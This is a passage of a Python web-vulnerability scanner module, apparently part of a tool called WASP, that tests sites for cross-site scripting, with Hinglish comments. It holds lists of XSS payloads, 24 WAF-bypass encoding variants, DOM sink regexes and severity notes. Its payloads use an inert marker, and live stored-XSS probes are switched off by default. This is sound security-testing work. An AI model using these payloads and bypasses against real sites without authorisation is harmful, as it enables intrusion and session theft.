        ranked, disc_meta = discover_xss_surface(base_out, scope, conf)
        cp.mark(ckA, [ranked, disc_meta], summary="xss surface")
    if not ranked:
        err("Koi XSS target nahi mila. P12 inject pehle chalao (reflection_map "
            "seed banta hai) ya scope.json check karo.")
        ctx["coverage"]["surface"] = "NOT-FOUND"
        write_reports(out, scope, F, ctx, meta, {}, [], [], conf)
        return out
    ok("%d XSS targets (evidence-ranked)" % len(ranked))
    ctx["ranked"] = ranked
    meta["total_mined"] = disc_meta.get("total_mined", 0)
    if len(ranked) < 3:
        F.add("xss_surface_sparse", "XSS surface chhota hai",
              scope.describe(), "sirf %d evidence-backed target(s) mile - P12 "
              "reflection_map seed khali hai; P5/P7/P8 deeper chalao." % len(ranked),
              evidence_ref="xss_surface.json")

    # ---------------- PASSIVE MODE ----------------
    if not getattr(cfg, "allow_active", True):
        warn("allow_active=False -> PASSIVE mode: discovery + offline hypotheses "
             "(0 network probes).")
        hyps = build_xss_hypotheses(ctx, {}, ranked)
        ctx["coverage"]["passive"] = "%d targets, %d hypotheses" % (len(ranked), len(hyps))
        write_reports(out, scope, F, ctx, meta, {}, hyps, ranked, conf)
        write_feedforward(out, PHASE, {"to_phase32_report": {"mode": "passive"}},
                          notes=["allow_active=false -> 0-probe passive run"])
        write_manifest(out, PHASE, ["xss_surface.json", "xss_targets.txt",
                                    "xss_test_plan.md", "findings.json",
                                    "feedforward.json"],
                       stats={"mode": "passive", "targets": len(ranked),
                              "hypotheses": len(hyps)})
        _rwx_tree(out)
        return out

    # ---------------- Stage B: calibration ----------------
    head("Stage B - Baseline & WAF calibration (+ CSP snapshot)")
    first_origin = "{0.scheme}://{0.netloc}".format(urllib.parse.urlsplit(ranked[0]["url"]))
    meta["origin"] = first_origin
    meta["soft404"] = soft404_for_origin(http, ranked[0]["url"], conf, cp)
    waf_map = []
    csp_map = []
    seen_ep = set()
    for t in ranked:
        ep = t["url"].split("?")[0]
        if ep in seen_ep:
            continue
        seen_ep.add(ep)
        if len(waf_map) < int(conf.get("xss_waf_probe_budget", 6)):
            w = waf_detect_xss(http, t["url"], t["param"], conf, cp, meta)
            if w:
                waf_map.append(w)
        base = baseline_endpoint(http, t["url"], conf, cp, tag="b")
        if base.get("ok"):
            snap = csp_snapshot_from_sample(base.get("headers") or {})
            if snap:
                csp_map.append({"url": ep, "headers": snap})
        if len(seen_ep) >= 16:
            break
    meta["waf_map"] = waf_map
    meta["csp_map"] = csp_map
    n_waf = len([w for w in waf_map if w.get("waf")])
    ok("calibration: %d endpoint(s) WAF-mapped (%d block-layer), %d CSP-snapshotted"
       % (len(waf_map), n_waf, len(csp_map)))
    for w in waf_map:
        if w.get("waf"):
            F.add("xss_probe_blocked", "WAF/block-layer: %s" % w["waf"],
                  w["url"], "Fingerprint: %s" % w.get("snippet", ""),
                  evidence_ref="xss_surface.json")

    results_by_stage = {}

    # ---------------- Stage C: reflection & context map ----------------
    head("Stage C - Reflection & context map (canary + 16-context classifier)")
    results_by_stage["reflect_map"] = reflect_map_stage(http, scope, F, ctx, conf,
                                                        ranked, meta, cp)
    ctx["reflect_records"] = results_by_stage["reflect_map"].get("records", [])

    # ---------------- Stage D: context payload ladder ----------------
    head("Stage D - Context payload ladder (inert structural probes)")
    results_by_stage["reflected_probes"] = reflected_probes_stage(http, scope, F, ctx,
                                                                  conf, ranked, meta, cp)
    ctx["probe_records"] = results_by_stage["reflected_probes"].get("records", [])

    # ---------------- Stage E: WAF bypass ladder ----------------
    head("Stage E - WAF/filter bypass ladder (24 encode/obfuscation variants)")
    results_by_stage["waf_bypass"] = waf_bypass_stage(http, scope, F, ctx, conf,
                                                      ranked, meta, cp)

    # ---------------- Stage F: DOM XSS ----------------
    head("Stage F - DOM XSS static analysis (sources x sinks, capped fetch)")
    results_by_stage["dom_xss"] = dom_xss_stage(http, scope, F, ctx, conf,
                                                ranked, meta, cp)
    ctx["dom_records"] = results_by_stage["dom_xss"].get("records", [])

    # ---------------- Stage G: stored candidates ----------------
    head("Stage G - Stored-XSS candidates%s"
         % (" (RoE-gated live probe ON)" if conf.get("xss_allow_stored_probe")
            else " (mapping only - live probe RoE-gated OFF)"))
    results_by_stage["stored"] = stored_candidates_stage(http, scope, F, ctx, conf,
                                                         ranked, meta, cp)

    # ---------------- Stage H: CSP audit ----------------
    head("Stage H - CSP & security-header audit (directive-level)")
    results_by_stage["csp"] = csp_audit_stage(http, scope, F, ctx, conf,
                                              ranked, meta, cp)

    # ---------------- Stage I: header reflect ----------------
    head("Stage I - Header-reflect XSS vectors (Referer/UA/XFH)")
    results_by_stage["header_reflect"] = header_reflect_stage(http, scope, F, ctx, conf,
                                                              ranked, meta, cp)

    # ---------------- Stage K: famous techniques ----------------
    head("Stage K - Famous-technique matrix (mXSS/fullwidth/JSON-embed/...)")
    results_by_stage["techniques"] = technique_matrix_stage(http, scope, F, ctx, conf,
                                                            ranked, meta, cp)

    # ---------------- Stage L: framework notes ----------------
    head("Stage L - Framework encoding notes (stack-mined, 0 requests)")
    ctx["framework_notes"] = framework_notes_stage(http, scope, F, ctx, conf,
                                                   ranked, meta, cp, base_out)

    # ---------------- Stage M: hypotheses ----------------
    head("Stage M - Hypotheses & chains")
    hyps = build_xss_hypotheses(ctx, results_by_stage, ranked)
    ok("%d hypothesis/manual item(s)" % len(hyps))

    # ---------------- Stage N: reports ----------------
    head("Stage N - Reports (findings/matrix/plan/chains/feedforward)")
    meta["probes_total"] = sum(
        (results_by_stage.get(s, {}).get("stats", {}) or {}).get("probes", 0)
        for s in results_by_stage)
    write_reports(out, scope, F, ctx, meta, results_by_stage, hyps, ranked, conf)
    info("probes sent (approx): %d | findings: %d" % (meta["probes_total"], len(F.items)))
    m, s = divmod(int(time.time() - t_start), 60)
    info("duration: %dm%02ds" % (m, s) if m else "duration: %ds" % s)
    return out


# ===========================================================================
# WIZARD (interactive config builder)
# ===========================================================================
def ask(prompt):
    try:
        return input("%s " % prompt)
    except EOFError:
        return ""


def _wizard():
    if not CORE:
        print("[-] wizard ke liye bhi wasp_core.py chahiye (isi folder me rakho).")
        sys.exit(1)
    head("Phase 13 wizard - XSS targets / gates config builder")
    cfg_path = sys.argv[2] if len(sys.argv) > 2 else "config.json"
    data = {}
    if os.path.exists(cfg_path):
        try:
            data = json.load(open(cfg_path)) or {}
        except Exception:
            data = {}
    targets = list(data.get("xss_manual_targets") or [])
    while True:
        print("\n  1) manual target add     2) targets dekho/del")
        print("  3) gates toggle (stored-probe/client-pp)")
        print("  4) probe budgets         5) save & exit")
        ch = ask("choice").strip()
        if ch == "1":
            u = ask("URL with param (e.g. https://site/search?q=term):").strip()
            if u.startswith("http") and "?" in u:
                sp, qs = _split_url(u)
                p = ask("param name [%s]:" % (qs[0][0] if qs else "q")).strip() \
                    or (qs[0][0] if qs else "q")
                targets = [t for t in targets if not (t.get("url") == u and t.get("param") == p)]
                targets.append({"url": u, "param": p})
                ok("target added")
            else:
                err("full URL + query param chahiye")
        elif ch == "2":
            for i, t in enumerate(targets):
                print("  [%d] %s  [%s]" % (i, t.get("url"), t.get("param")))
            d = ask("delete index (khali = kuch nahi):").strip()
            if d.isdigit() and int(d) < len(targets):
                targets.pop(int(d))
        elif ch == "3":
            print("  a) xss_allow_stored_probe (ab: %s) - RoE gate!" %
                  data.get("xss_allow_stored_probe", False))
            print("  b) xss_allow_client_pp   (ab: %s)" %
                  data.get("xss_allow_client_pp", True))
            g = ask("toggle which (a/b):").strip()
            key = {"a": "xss_allow_stored_probe", "b": "xss_allow_client_pp"}.get(g)
            if key:
                data[key] = not bool(data.get(key, key != "xss_allow_stored_probe"))
                ok("%s = %s" % (key, data[key]))
        elif ch == "4":
            for key in ("xss_reflect_probes", "xss_context_probes",
                        "xss_waf_probes", "xss_dom_fetch", "xss_header_probes"):
                v = ask("%s [%s]:" % (key, DEFAULTS.get(key))).strip()
                if v.isdigit():
                    data[key] = int(v)
        elif ch == "5":
            data["xss_manual_targets"] = targets
            with open(cfg_path, "w") as f:
                json.dump(data, f, indent=2)
            _rwx_result(cfg_path)
            ok("saved -> %s (targets: %d)" % (cfg_path, len(targets)))
            break


def main():
    if len(sys.argv) >= 2 and sys.argv[1] == "wizard":
        _wizard()
        return
    print("WASP mod_xss.py (Phase 13 - XSS, v%s)" % PLAN_VERSION)
    print("  run        : python3 wasp.py run --module 13   (ya --module xss)")
    print("  wizard     : python3 mod_xss.py wizard [config.json]")
    print("  self-test  : python3 test_mod_xss.py")
    print("\n  Module wasp.py ke through chalta hai (scope/budget/rate-limit wahan se).")


if __name__ == "__main__":
    main()

# ---------------------------------------------------------------------------
# TUNABLES (config.json se override; module ke apne defaults bhi hain)
# ---------------------------------------------------------------------------
DEFAULTS = {
    "xss_surface_cap": 24,            # max ranked targets probed
    "xss_param_cap": 40,              # max unique params considered
    "xss_reflect_probes": 20,         # stage C canary probes
    "xss_context_probes": 24,         # stage D structural payload cap
    "xss_waf_probes": 14,             # stage E bypass-ladder cap (per blocked set)
    "xss_waf_probe_budget": 6,        # stage B WAF-fingerprint probe cap
    "xss_dom_fetch": 8,               # stage F fresh JS fetch cap (expensive)
    "xss_header_probes": 6,           # stage I header-reflect probes
    "xss_allow_stored_probe": False,  # stage G RoE gate (default OFF!)
    "xss_stored_probes": 4,           # stage G probe cap (jab ON ho)
    "xss_technique_probes": 8,        # stage K famous-technique probe cap
    "xss_allow_client_pp": True,      # stage F/K client __proto__ canary (GET, inert)
}


# ===========================================================================
# KNOWLEDGE TABLES
# ===========================================================================
# Param-name families: naam se hypothesis (P8/P12 PARAM_HINT se compatible).
XSS_PARAM_HINTS = [
    "q", "query", "search", "s", "keyword", "k", "term", "find", "text",
    "name", "username", "user", "nickname", "nick", "firstname", "lastname",
    "full_name", "title", "subject", "summary", "description", "bio", "about",
    "comment", "comments", "message", "msg", "body", "content", "post",
    "reply", "note", "caption", "status", "tweet", "review", "feedback",
    "email", "mail", "phone", "address", "city", "country", "company",
    "url", "link", "website", "site", "homepage", "redirect", "next",
    "return", "return_url", "returnTo", "goto", "go", "continue", "dest",
    "callback", "cb", "forward", "out", "ref", "reference", "error", "err",
    "msg_type", "type", "view", "page", "p", "id", "lang", "locale", "theme",
    "template", "tpl", "preview", "render", "display", "show", "layout",
    "callback_fn", "jsonp", "cb_name", "format", "sort", "order", "filter",
    "tag", "tags", "category", "cat", "label", "alt", "placeholder", "value",
    "data", "val", "input", "field", "html", "markup", "rich", "editor",
]

# Stored-XSS-ripe field names (form-classifier, stage G)
STORED_FIELD_HINTS = [
    "comment", "comments", "message", "msg", "bio", "about", "description",
    "summary", "signature", "status", "post", "post_content", "body",
    "content", "reply", "review", "feedback", "note", "caption", "title",
    "nickname", "display_name", "full_name", "firstname", "lastname",
    "profile_text", "intro", "announcement", "editor", "rich", "html",
]

# ---------------------------------------------------------------------------
# CONTEXT MODEL (stage C classifier) - 16 contexts
# order matters: pehle tight/inner contexts, phir loose/outer
# ---------------------------------------------------------------------------
CTX_RULES = [
    # NOTE: js-string/js-tmpl/js-raw is list me NAHI hain - wo script-block
    # anchoring se reflection_context_xss() me handle hote hain (warna ye
    # loose quote-rules HTML attribute values ko shadow kar dete hain).
    ("html-comment",   re.compile(r"<!--[^>]{0,300}%s[^>]{0,300}-->")),
    ("rcdata",         re.compile(r"(?is)<(textarea|title)[^>]*>[^<]{0,300}%s[^<]{0,300}</\1>")),
    ("noscript",       re.compile(r"(?is)<noscript[^>]*>[^<]{0,300}%s[^<]{0,300}</noscript>")),
    ("style-block",    re.compile(r"(?is)<style[^>]*>[^<]{0,300}%s[^<]{0,300}</style>")),
    ("style-attr",     re.compile(r"(?is)style\s*=\s*['\"][^'\"]{0,200}%s")),
    ("url-attr",       re.compile(r"(?is)(href|src|action|formaction|data|xlink:href|poster)\s*=\s*['\"]?[^'\">\s]{0,80}%s")),
    ("meta-refresh",   re.compile(r"(?is)<meta[^>]+(http-equiv|content)[^>]{0,200}%s")),
    ("html-attr-dq",   re.compile(r"""<[a-zA-Z][^>]{0,200}\w+=[\"]([^\"]{0,160}%s[^\"]{0,40})[\"]""")),
    ("html-attr-sq",   re.compile(r"""<[a-zA-Z][^>]{0,200}\w+=[']([^']{0,160}%s[^']{0,40})[']""")),
    ("html-attr-uq",   re.compile(r"<[a-zA-Z][^>]{0,200}\w+=([^\s'>]{0,160}%s[^\s'>]{0,40})[\s>]")),
    ("form-value",     re.compile(r"(?is)<input[^>]{0,220}value\s*=\s*['\"]?[^'\"]{0,160}%s")),
    ("inside-tag",     re.compile(r"<[a-zA-Z][^>]{0,240}%s[^>]{0,240}>")),
    ("html-body",      re.compile(r">[^<>]{0,200}%s[^<>]{0,200}<")),
]

# Context -> (payload-builder key, breakout-kind)
CTX_EXPLOIT_KIND = {
    "html-body": "tag-injection",
    "inside-tag": "event-handler-injection",
    "html-attr-dq": "quote-breakout",
    "html-attr-sq": "quote-breakout",
    "html-attr-uq": "space-breakout",
    "js-string": "js-breakout",
    "js-tmpl": "tmpl-breakout",
    "js-raw": "raw-js-injection",
    "html-comment": "comment-breakout",
    "rcdata": "rcdata-breakout",
    "noscript": "noscript-mutation",
    "style-block": "css-breakout",
    "style-attr": "css-breakout",
    "url-attr": "scheme-injection",
    "meta-refresh": "scheme-injection",
    "form-value": "quote-breakout",
}

# ---------------------------------------------------------------------------
# STAGE D: context payload ladder (SAB INERT - event values waspP13() sirf,
# undefined function -> execute ho bhi jaye to sirf ReferenceError; koi
# external host, koi real JS, koi exfil canary KABHI nahi - FIX-7)
# ---------------------------------------------------------------------------
MARK_JS = "waspP13()"

TAG_VECTORS = [
    ("<svg/onload=%s>" % MARK_JS, "svg-onload"),
    ("<img src=x onerror=%s>" % MARK_JS, "img-onerror"),
    ("<details open ontoggle=%s>" % MARK_JS, "details-ontoggle"),
    ("<video><source onerror=%s>" % MARK_JS, "video-onerror"),
    ("<audio src=x onerror=%s>" % MARK_JS, "audio-onerror"),
    ("<body onload=%s>" % MARK_JS, "body-onload"),
    ("<marquee onstart=%s>" % MARK_JS, "marquee-onstart"),
    ("<input autofocus onfocus=%s>" % MARK_JS, "input-autofocus"),
    ("<select autofocus onfocus=%s>" % MARK_JS, "select-autofocus"),
    ("<textarea autofocus onfocus=%s>" % MARK_JS, "textarea-autofocus"),
    ("<keygen autofocus onfocus=%s>" % MARK_JS, "keygen-autofocus"),
    ("<iframe srcdoc=\"&lt;script&gt;%s&lt;/script&gt;\">" % MARK_JS, "iframe-srcdoc"),
    ("<svg><animate onbegin=%s attributeName=x dur=1s>" % MARK_JS, "svg-animate"),
    ("<svg><a xlink:href=\"javascript:%s\"><text x=20 y=20>x</text></a>" % MARK_JS, "svg-xlink"),
    ("<xss style=\"animation-name:x13\" onanimationstart=%s>" % MARK_JS, "css-animation"),
    ("<style>@keyframes x13{}</style><xss style=\"animation-name:x13\" onanimationstart=%s>" % MARK_JS, "css-anim-self"),
    ("<object data=\"javascript:%s\">" % MARK_JS, "object-data"),
    ("<embed src=\"javascript:%s\">" % MARK_JS, "embed-src"),
    ("<form><button formaction=\"javascript:%s\">x</button>" % MARK_JS, "form-button"),
    ("<isindex action=\"javascript:%s\" type=image>" % MARK_JS, "isindex-legacy"),
    ("<math><mtext><table><mglyph><style><!--</style><img title=\"--&gt;&lt;/mglyph&gt;&lt;img&Tab;src=1&Tab;onerror=%s&gt;\">" % MARK_JS, "mxss-mathml"),
    ("<body onpageshow=%s>" % MARK_JS, "onpageshow"),
    ("<xss id=x tabindex=1 onfocus=%s></xss>" % MARK_JS, "focus-fragment"),
]

# per-context breaker payloads: (label, prefix, suffix) -> payload = pre + TAG + post
CTX_BREAKERS = {
    "html-body":       [("", "")],
    "inside-tag":      [(" ", ""), ("\" ", ""), ("' ", ""), ("` ", "")],
    "html-attr-dq":    ("\"><", ">"),
    "html-attr-sq":    ("'><", ">"),
    "html-attr-uq":    (" <", ">"),
    "form-value":      ("\"><", ">"),
    "js-string":       [("'", ";%s//" % MARK_JS), ("\"", ";%s//" % MARK_JS),
                        ("\\';", "%s;//" % MARK_JS),
                        ("</script><svg/onload=", ">")],
    "js-tmpl":         ("${%s}" % MARK_JS, ""),
    "js-raw":          (";", "%s;" % MARK_JS),
    "html-comment":    ("--><", ">"),
    "rcdata":          ("</textarea></title><", ">"),
    "noscript":        ("</noscript><", ">"),
    "style-block":     ("</style><", ">"),
    "style-attr":      ("\",x:expression(%s)}" % MARK_JS, ""),  # legacy expression()
    "url-attr":        [("javascript:%s//" % MARK_JS, ""), ("javascript&colon;%s//" % MARK_JS, ""),
                        ("jav&#x09;ascript:%s//" % MARK_JS, ""), ("data:text/html;base64," , "")],
    "meta-refresh":    [("javascript:%s//" % MARK_JS, ""), ("data:text/html;base64,", "")],
}
# NOTE: url-attr "data:" variants SIRF record/reflect-level test hote hain -
# render koi nahi karta (bina click), aur base64 payloads kabhi generate nahi.

SCHEME_PROBES = [
    ("javascript:", "js-scheme"),
    ("JaVaScRiPt:", "js-scheme-case"),
    ("java\tscript:", "js-tab-embedded"),
    ("javascript&colon;", "js-entity-colon"),
    ("jav&#x0A;ascript:", "js-entity-nl"),
    ("data:text/html", "data-uri"),
    ("vbscript:", "vbs-legacy"),
]

# ---------------------------------------------------------------------------
# STAGE E: WAF/filter bypass ladder - (label, transform(payload))
# Har variant inert-marker payload ko reshape karta hai; jo variant pass hua
# wahi WINNING variant = finding ka proof-detail. Koi external reference nahi.
# ---------------------------------------------------------------------------
WAF_BYPASS_VARIANTS = [
    ("case-mix",          lambda p: re.sub(r"(?i)svg", "SvG", re.sub(r"(?i)onload", "oNlOaD", p))),
    ("tab-in-tag",        lambda p: p.replace("<svg", "<svg\t")),
    ("newline-in-tag",    lambda p: p.replace("<svg", "<svg%0a")),
    ("ff-in-tag",         lambda p: p.replace("<svg", "<svg%0c")),
    ("slash-sep",         lambda p: p.replace("<svg/onload", "<svg//onload")),
    ("broken-attr",       lambda p: p.replace("<svg/onload=", "<svg/onload<>=```")),
    ("double-urlenc",     lambda p: urllib.parse.quote(urllib.parse.quote(p, safe=""), safe="")),
    ("triple-urlenc",     lambda p: urllib.parse.quote(urllib.parse.quote(
                              urllib.parse.quote(p, safe=""), safe=""), safe="")),
    ("html-entity-dec",   lambda p: p.replace("<", "&#60;").replace(">", "&#62;")),
    ("html-entity-hex",   lambda p: p.replace("<", "&#x3c;").replace(">", "&#x3e;")),
    ("entity-no-semi",    lambda p: p.replace("<", "&#x3C").replace(">", "&#x3E")),
    ("json-unicode",      lambda p: p.replace("<", "\\u003c").replace(">", "\\u003e")),
    ("fullwidth-lt",      lambda p: p.replace("<", "\uff1c").replace(">", "\uff1e")),
    ("utf7-legacy",       lambda p: p.replace("<", "+ADw-").replace(">", "+AD4-")),
    ("null-byte-legacy",  lambda p: p.replace("<", "%00<")),
    ("comment-in-tag",    lambda p: p.replace("<svg", "<svg<!-- -->")),
    ("entity-parens",     lambda p: p.replace("(", "&lpar;").replace(")", "&#41;")),
    ("entity-colon-scheme", lambda p: p.replace("javascript:", "javascript&colon;")),
    ("tab-encoded-scheme", lambda p: p.replace("javascript:", "jav%09ascript:")),
    ("multi-close",       lambda p: "</textarea></title></style></script>" + p),
    ("comment-break",     lambda p: "<!--><img src=x onerror=%s><!--" % MARK_JS
                              if "svg" in p else p),
    ("mxss-noscript",     lambda p: '<noscript><p title="</noscript><img src=x onerror=%s>">' % MARK_JS
                              if "svg" in p else p),
    ("animate-href",      lambda p: "<svg><a xlink:href=?x><animate attributeName=href "
                              "values=javascript:%s /><text x=20 y=20>x</text></a></svg>" % MARK_JS
                              if "svg" in p else p),
    ("srcdoc-enc",        lambda p: '<iframe srcdoc="&lt;svg onload=%s&gt;"></iframe>' % MARK_JS
                              if "svg" in p else p),
]

# ---------------------------------------------------------------------------
# STAGE F: DOM source/sink knowledge (static, regex families)
# ---------------------------------------------------------------------------
DOM_SOURCES = [
    (r"location\.hash", "location.hash"),
    (r"location\.search", "location.search"),
    (r"location\.href", "location.href"),
    (r"location(?!\.(?:hash|search|href|pathname|host|protocol|origin|port|reload|replace|assign))\s*=", "location-assign"),
    (r"document\.URL", "document.URL"),
    (r"document\.documentURI", "document.documentURI"),
    (r"document\.referrer", "document.referrer"),
    (r"window\.name", "window.name"),
    (r"event\.data", "postMessage.data"),
    (r"localStorage\.getItem", "localStorage"),
    (r"sessionStorage\.getItem", "sessionStorage"),
    (r"\bgup\s*\(", "gup-helper"),
    (r"\bdeparam\s*\(", "deparam-helper"),
    (r"\bgetQueryVariable\s*\(", "getQueryVariable-helper"),
    (r"\bgetParam(?:eter)?\s*\(", "getParam-helper"),
]

DOM_SINKS = [
    (r"\.innerHTML\s*=", "innerHTML"),
    (r"\.outerHTML\s*=", "outerHTML"),
    (r"document\.write(?:ln)?\s*\(", "document.write"),
    (r"\beval\s*\(", "eval"),
    (r"\bexecScript\s*\(", "execScript"),
    (r"\bnew\s+Function\s*\(", "Function-ctor"),
    (r"\bFunction\s*\(\s*['\"]", "Function-ctor"),
    (r"setTimeout\s*\(\s*['\"`]", "setTimeout-string"),
    (r"setInterval\s*\(\s*['\"`]", "setInterval-string"),
    (r"\.insertAdjacentHTML\s*\(", "insertAdjacentHTML"),
    (r"\$\s*\(\s*(?:location|document|window)", "jquery-selector-injection"),
    (r"\$\.parseHTML\s*\(", "jquery-parseHTML"),
    (r"\.html\s*\(\s*[^)]{0,60}(?:location|hash|search|param|name)", "jquery-html"),
    (r"\.append\s*\(\s*[^)]{0,60}(?:location|hash|search|param)", "jquery-append"),
    (r"\.attr\s*\(\s*['\"](?:href|src|action)['\"]", "jquery-attr-href"),
    (r"\$\.(?:get|post|ajax)\s*\(\s*[^)]{0,60}(?:location|hash|search)", "jquery-dynamic-url"),
    (r"\bbypassSecurityTrust(?:Html|Url|Script)", "angular-bypass"),
    (r"\bdangerouslySetInnerHTML", "react-dangerous"),
    (r"\bv-html\b", "vue-v-html"),
    (r"\$sce\.trustAs(?:Html|ResourceUrl)", "angular-sce-trust"),
    (r"\.src\s*=\s*[^;]{0,60}(?:location|hash|search|name|param)", "dynamic-src"),
    (r"\bopen\s*\(\s*[^)]{0,60}(?:location|hash|search|name)", "window-open"),
]

DOM_FRAMEWORK_HINTS = [
    (r"(?i)react(?:-dom)?(?:\.min)?\.js|_react|__NEXT_DATA__", "react"),
    (r"(?i)angular(?:\.min)?\.js|ng-app|zone\.js", "angular"),
    (r"(?i)vue(?:\.min)?\.js|__vue__|data-v-app", "vue"),
    (r"(?i)jquery[.\-]?\d|jquery\.min\.js", "jquery"),
]

CLIENT_PP_SINKS = [
    (r"\$\.(?:extend|deepExtend)\s*\(\s*true", "jquery-deep-extend"),
    (r"merge\s*\(\s*true", "obj-merge-true"),
    (r"Object\.assign\s*\(\s*\{\}", "object-assign"),
    (r"lodash.*merge|_\.merge\s*\(", "lodash-merge"),
]

# ---------------------------------------------------------------------------
# STAGE L: framework encoding notes (0 requests - mined stack se)
# ---------------------------------------------------------------------------
FRAMEWORK_NOTES = {
    "react":    "React JSX auto-escapes by default; XSS sinks = dangerouslySetInnerHTML, "
                "href={userInput} (javascript: URL), server-side render injection. "
                "Stage F 'react-dangerous' sink mile to yahi context report karo.",
    "angular":  "Angular sanitizer active by default; sinks = bypassSecurityTrustHtml/Url/Script, "
                "[innerHTML]= binding. AngularJS (<1.6) me {{constructor.constructor(...)}} "
                "sandbox-escape templates legacy (sirf hypothesis).",
    "vue":      "Vue auto-escapes interpolation {{}}; sink = v-html directive + :href bindings. "
                "v-html + user-content = stored-XSS candidate.",
    "jquery":   "jQuery $(location.hash)-style selector injection classic; .html()/.append() "
                "user data = DOM XSS. Stage F sink table isi par focused hai.",
    "django":   "Django templates auto-escape; sinks = |safe filter, mark_safe(), "
                "{% autoescape off %}. Jinja2 me |safe + Markup().",
    "laravel":  "Blade {{ }} escapes; sink = {!! !!}. Raw-blade + user input = reflected XSS.",
    "rails":    "ERB auto-escape (rails>=3); sink = raw/html_safe. html_safe + user data = stored.",
    "express":  "Server-side XSS mostly template-engine dependent (EJS <%= vs <%-) - "
                "<%- raw output = reflected XSS. DOM XSS client JS par depend karta hai.",
    "php":      "echo/print user data without htmlspecialchars = classic reflected; "
                "strip_tags partial hai (attributes bachte hain) - weak filter hint.",
    "aspnet":   "Razor @Html.Raw() = sink; request validation (legacy) bypass = "
                "encoding tricks (stage E variants isi ke liye hain).",
}

# ---------------------------------------------------------------------------
# SEVERITY HINTS (key -> (severity, cvss_hint, why_it_matters))
# ---------------------------------------------------------------------------
SEVERITY_HINTS = {
    "xss_reflected_confirmed": ("high", 8.1,
        "Structural XSS payload verbatim reflect + context exploit-capable "
        "(surviving-charset table me proof). CSP 'unsafe-inline' ho to direct "
        "session-theft class; demo payload inert marker tha (detection-only)."),
    "xss_reflected_partial": ("medium", 6.1,
        "Payload partially reflect / filter ne kuch strip kiya - weak filtering; "
        "surviving-charset + bypass-ladder se manual exploitability nikaalo."),
    "xss_waf_bypassable": ("high", 8.6,
        "WAF XSS payloads block karta hai par encode/obfuscation variant ke "
        "neeche same structure pass hota hai - defense-in-depth weak, sink live."),
    "xss_dom_suspected": ("medium", 6.4,
        "DOM source->sink static link (same inline script me user-controlled "
        "source markup-sink me) - runtime confirm PoC manual (fragment value "
        "browser me daal kar), payload inert discipline same hai."),
    "xss_dom_sink_no_source": ("low", 3.2,
        "Markup sink present par same-script source nahi mila - gadget-chain "
        "(PP/link-injection) hypothesis; manual source hunt karo."),
    "xss_dom_source_no_sink": ("info", 0.0,
        "User-controlled DOM source present, sink nahi - future sink additions "
        "ke liye watch-list item."),
    "xss_postmessage_no_origin": ("medium", 5.8,
        "postMessage listener event.origin validate nahi karta (ya event.data "
        "markup-sink me jaata hai) - cross-origin message se DOM injection "
        "hypothesis (PoC browser-side, RoE-bounded)."),
    "xss_stored_candidate": ("high", 8.0,
        "Stored-XSS candidate (field/flow ripe: cross-page echo ya "
        "comment/profile-class field) - live probe RoE-gated tha (default OFF); "
        "APNE test account par confirm karo."),
    "xss_stored_confirmed": ("critical", 9.3,
        "Stored XSS confirmed (own-account field me inert marker baki users ke "
        "render me) - sabse high-impact XSS class. Live probe RoE-gated path se."),
    "xss_js_string_breakout": ("high", 8.1,
        "JS string context me quote verbatim bachta hai - script-context "
        "injection; yahan CSP bypass bhi zaroori hota hai (unsafe-inline check "
        "csp_analysis.json me)."),
    "xss_url_scheme_injection": ("medium", 6.1,
        "URL-attribute context javascript:/entity-colon scheme verbatim reflect "
        "- click-required vector (link-injection); CSP navigate-to relevant."),
    "xss_rcdata_breakout": ("high", 7.4,
        "textarea/title RCDATA breakout verbatim - parser-level filter missing; "
        "markup context me inject ho sakta hai."),
    "xss_comment_breakout": ("medium", 5.4,
        "HTML comment breakout (-->) verbatim - downstream parser confusion / "
        "mXSS building block."),
    "xss_noscript_mutation": ("medium", 6.4,
        "noscript-context content mutation (mXSS family) - innerHTML round-trip "
        "par payload morph hota hai; static filters isko miss karte hain."),
    "xss_csp_missing": ("medium", 5.3,
        "Content-Security-Policy header absent - reflected/DOM XSS ke against "
        "browser-level defense absent (direct exploitability boost)."),
    "xss_csp_unsafe_inline": ("medium", 5.8,
        "CSP me script-src 'unsafe-inline' - nonce/hash defense bypass; "
        "reflected XSS payload execute-capable."),
    "xss_csp_weak": ("low", 3.8,
        "CSP present par weak (wildcard/data:-in-script-src/object-src-missing/"
        "base-uri-missing) - allowlist-abuse hypotheses csp_analysis.json me."),
    "xss_header_link_injection": ("low", 3.7,
        "Header value (XFH/Referer/UA) body me verbatim reflect - link/"
        "cache-poisoning chains ka building block (P26 handoff)."),
    "xss_urlattr_reflect": ("low", 3.4,
        "URL-attribute me canary verbatim - scheme-injection manual follow-up "
        "(click-required); javascript:-variant ladder record me hai."),
    "xss_json_script_embed": ("medium", 6.1,
        "JSON response </ escape miss + HTML page me <script>-embedded render - "
        "json-in-script gadget (P17 API handoff)."),
    "xss_client_pp_hint": ("low", 3.5,
        "Client-side deep-merge gadget (jQuery $.extend(true)/lodash merge) + "
        "__proto__-in-query canary reflect - PP->XSS gadget hypothesis (P20)."),
    "xss_framework_sink_note": ("info", 0.0,
        "Framework-level sink note (dangerouslySetInnerHTML/v-html/bypassTrust "
        "class) - code-review handoff (framework_notes.json)."),
    "xss_reflect_ripe": ("info", 0.0,
        "Param canary verbatim reflect (context mapped) - stage D payload-ladder "
        "ka direct input; yahan structural probe jayega."),
    "xss_surface_sparse": ("info", 0.0,
        "Bahut kam XSS targets mile - P12 reflection_map khali ya P5/P7/P8 "
        "deeper chalao (evidence-first discipline)."),
    "xss_baseline_unstable": ("info", 0.0,
        "Endpoint baseline unstable (double-fetch diff) - is target ke verdicts "
        "NOISE mark hue; manual test karo."),
    "xss_probe_blocked": ("info", 0.0,
        "XSS probes WAF/validation ne block kiye - bug nahi; stage E bypass "
        "ladder ka input."),
}

SEV_ORDER_XSS = ("critical", "high", "medium", "low", "info")


def classify_severity(key):
    sev, cvss, why = SEVERITY_HINTS.get(key, ("info", 0.0, "XSS-surface signal."))
    return sev, cvss, why


# ---------------------------------------------------------------------------
# CHAIN HINTS (attack-chain documentation, xss_chains.txt me jaata hai)
# ---------------------------------------------------------------------------
CHAIN_HINTS = [
    {"when": "xss_reflected_confirmed|xss_js_string_breakout",
     "then": "1) CSP check (csp_analysis.json): 'unsafe-inline'/no-CSP = "
             "direct PoC; nonce CSP me nonce-leak/gadget hunt; 2) payload "
             "browser me SIRF apne session par demo karo (marker alert tak "
             "hi, exfil KABHI); 3) fix: context-aware output-encoding + CSP "
             "tighten (nonce + strict-dynamic).",
     "impact": "HIGH -> session-theft class (CSP-dependent)"},
    {"when": "xss_waf_bypassable",
     "then": "winning variant (proof me hai) report me encode-chain ke saath "
